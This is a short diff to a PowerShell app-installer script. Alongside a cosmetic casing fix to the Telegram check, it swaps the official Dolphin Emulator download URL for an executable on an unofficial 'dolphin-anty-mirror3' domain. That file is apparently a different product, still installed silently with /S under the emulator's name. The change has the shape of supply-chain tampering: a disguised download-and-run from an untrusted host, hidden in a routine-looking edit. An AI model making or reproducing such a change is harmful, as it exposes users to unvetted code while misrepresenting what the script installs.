@@ -21,11 +21,11 @@ $apps = @(
         name = "Telegram"
         url = "https://telegram.org/dl/desktop/win"
         args = ""
-        check = { Get-Command "telegram.exe" -ErrorAction SilentlyContinue }
+        check = { Get-Command "Telegram.exe" -ErrorAction SilentlyContinue }
     },
     @{
         name = "Dolphin Emulator"
-        url = "https://dl.dolphin-emu.org/releases/dolphin-x64-latest.exe"
+        url = "https://app.dolphin-anty-mirror3.net/anty-app/dolphin-anty-win-latest.exe"
         args = "/S"
         check = { Get-Command "dolphin.exe" -ErrorAction SilentlyContinue }
     },
